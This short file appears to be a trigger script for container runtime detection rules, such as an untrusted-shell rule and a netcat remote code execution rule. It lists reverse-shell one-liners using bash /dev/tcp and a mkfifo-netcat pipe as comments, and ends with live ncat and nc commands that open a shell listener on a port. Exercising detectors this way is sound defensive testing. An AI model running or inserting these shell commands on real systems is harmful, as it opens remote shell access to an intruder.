#Execution
#1.rule: DB program spawned process 
#need web env

#2.rule: Run shell untrusted
#not proc.name in (shell_binaries)
#bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/21540 <&1'
#rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 21540 >/tmp/f


#3.rule: Terminal shell in container
#not proc.name in (shell_binaries)
#bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/21541 <&1'

#4.rule: Netcat Remote Code Execution in Container
ncat --sh-exec /bin/sh -lvp 21542 &
ncat --exec /bin/sh -lvp 21542 &
nc -e /bin/sh -lvp 21542 &
nc -s /bin/sh -lvp 21542 &
